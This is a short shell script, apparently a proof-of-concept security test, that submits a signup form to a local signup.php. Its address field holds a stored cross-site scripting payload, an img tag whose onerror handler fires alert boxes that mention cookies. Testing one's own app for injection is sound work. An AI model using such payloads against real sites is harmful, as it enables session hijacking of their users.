#!/bin/sh

curl -X POST localhost/signup.php \
		 	-d "email=hejsan@curl" \
		 	-d "name=curl4hax" \
		 	-d "address=<img src=x onerror=\"alert('here are your cookies'); alert(document.cokie);\"\/>" \
			-d "password=allizwell123" \
			-d "password_repeat=allizwell123"